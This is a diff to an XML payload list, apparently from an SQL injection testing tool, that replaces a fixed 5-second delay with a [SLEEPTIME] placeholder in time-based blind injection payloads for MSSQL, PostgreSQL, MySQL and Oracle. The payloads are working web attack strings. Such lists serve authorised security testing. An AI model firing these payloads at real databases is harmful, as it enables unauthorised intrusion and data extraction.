@@ -4,27 +4,27 @@
         <title>MSSQL Time-Based Blind (Stacked)</title>
         <stype>5</stype>
         <dbms>MSSQL</dbms>
-        <payload>; WAITFOR DELAY '0:0:5'</payload>
+        <payload>; WAITFOR DELAY '0:0:[SLEEPTIME]'</payload>
     </test>
 
     <test>
         <title>PostgreSQL Time-Based Blind</title>
         <stype>5</stype>
         <dbms>PostgreSQL</dbms>
-        <payload>AND 8341=(SELECT 8341 FROM PG_SLEEP(5))</payload>
+        <payload>AND 8341=(SELECT 8341 FROM PG_SLEEP([SLEEPTIME]))</payload>
     </test>
 
     <test>
         <title>MySQL Time-Based Blind</title>
         <stype>5</stype>
         <dbms>MySQL</dbms>
-        <payload>AND (SELECT 8341 FROM (SELECT(SLEEP(5)))qweqwe)</payload>
+        <payload>AND (SELECT 8341 FROM (SELECT(SLEEP([SLEEPTIME])))qweqwe)</payload>
     </test>
 
     <test>
         <title>Oracle Time-Based Blind</title>
         <stype>5</stype>
         <dbms>Oracle</dbms>
-        <payload>AND 8341=DBMS_PIPE.RECEIVE_MESSAGE('qweqwe',5)</payload>
+        <payload>AND 8341=DBMS_PIPE.RECEIVE_MESSAGE('qweqwe',[SLEEPTIME])</payload>
     </test>
 </root>
